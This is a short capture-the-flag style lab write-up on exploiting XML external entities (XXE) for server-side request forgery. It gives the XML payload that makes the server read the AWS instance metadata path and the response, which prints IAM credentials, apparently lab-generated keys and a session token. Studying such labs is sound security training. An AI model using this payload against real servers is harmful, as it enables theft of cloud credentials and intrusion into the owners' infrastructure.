# Lab: Exploiting XXE to perform SSRF attacks
## Description
First tried this:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```
Which returned
`"Invalid product ID: latest"`

At first, I didn't notice, but the attack actually worked, it just didn't return the correct information. You'd have to be more explicit. I ended up walking the tree/path:
```
http://169.254.169.254/latest/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```
Bingo


## Solution

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

Returned
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 546

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2021-09-01T22:01:22.729203Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "V8GUIUC5MhNt6SjD06T0",
  "SecretAccessKey" : "IQs2USUZsauFENqP9yZyjSBEiYKOU8FFekIfxDZI",
  "Token" : "shJ4pRrzmQ7UehhDfL9jKdMdGP1Fh9suRwYrY1Q5t0c191s45YxPnw0H9NIHn6y94WHIJjJpVkpdHGqXRCaVkK7p9D8iLFZnTD753NLsnRmctI1JW6ZzCHcnCURySVNmVGEtRqg8xCAvmILzazUhgV9bDktLwJW1QkiXAk119a6BGetWoyXpoDlqvRaoR6GA3TkdcfLTP6cGb6Y4C6yj1JBcgSrak3D2RS3lS7oUZmHyWljMAQGxa5nmHb0NpjLE",
  "Expiration" : "2027-08-31T22:01:22.729203Z"
}"
```